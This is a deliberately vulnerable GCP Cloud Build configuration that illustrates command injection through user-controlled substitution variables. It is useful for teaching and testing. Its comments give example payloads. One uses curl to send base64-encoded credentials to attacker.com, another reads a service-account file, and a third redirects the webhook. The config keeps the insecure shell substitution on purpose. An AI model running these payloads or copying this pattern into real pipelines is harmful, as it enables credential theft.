# =============================================================================
# GCP Cloud Build -- cloudbuild.yaml -- VULNERABLE VERSION
# =============================================================================
# This configuration demonstrates substitution variable abuse.
# User-controlled substitution variables are injected directly into
# shell commands without validation, enabling command injection.
# =============================================================================

steps:
  # Step 1: Build the Docker image
  - name: 'gcr.io/cloud-builders/docker'
    args:
      - 'build'
      - '-t'
      - 'gcr.io/$PROJECT_ID/${_IMAGE_NAME}:${_IMAGE_TAG}'
      # VULNERABILITY: _IMAGE_NAME and _IMAGE_TAG are user-controllable
      # An attacker can set _IMAGE_NAME to:
      #   my-app --build-arg SECRET=$(cat /workspace/service-account.json)
      - '.'

  # Step 2: Run tests
  - name: 'gcr.io/$PROJECT_ID/${_IMAGE_NAME}:${_IMAGE_TAG}'
    entrypoint: 'sh'
    args:
      - '-c'
      # VULNERABILITY: Substitution variable directly in shell command
      # _TEST_COMMAND can be set to: "npm test; curl https://attacker.com/$(cat /workspace/credentials.json | base64)"
      - '${_TEST_COMMAND}'

  # Step 3: Deploy
  - name: 'gcr.io/cloud-builders/gcloud'
    args:
      - 'run'
      - 'deploy'
      - '${_SERVICE_NAME}'
      # VULNERABILITY: _SERVICE_NAME could contain shell metacharacters
      - '--image'
      - 'gcr.io/$PROJECT_ID/${_IMAGE_NAME}:${_IMAGE_TAG}'
      - '--region'
      - '${_REGION}'
      - '--platform'
      - 'managed'

  # Step 4: Notify
  - name: 'gcr.io/cloud-builders/curl'
    args:
      - '-X'
      - 'POST'
      - '${_WEBHOOK_URL}'
      # VULNERABILITY: _WEBHOOK_URL is user-controllable
      # Attacker can set it to their own endpoint to receive build metadata
      - '-d'
      - '{"build": "$BUILD_ID", "project": "$PROJECT_ID", "commit": "$COMMIT_SHA"}'

substitutions:
  _IMAGE_NAME: 'my-app'
  _IMAGE_TAG: 'latest'
  _TEST_COMMAND: 'npm test'
  _SERVICE_NAME: 'my-service'
  _REGION: 'us-central1'
  _WEBHOOK_URL: 'https://hooks.slack.com/services/TXXXXX/BXXXXX/xxxxx'

options:
  # VULNERABILITY: Substitution validation disabled
  substitution_option: 'ALLOW_LOOSE'
  # VULNERABILITY: Build runs with default (overprivileged) service account
  logging: CLOUD_LOGGING_ONLY
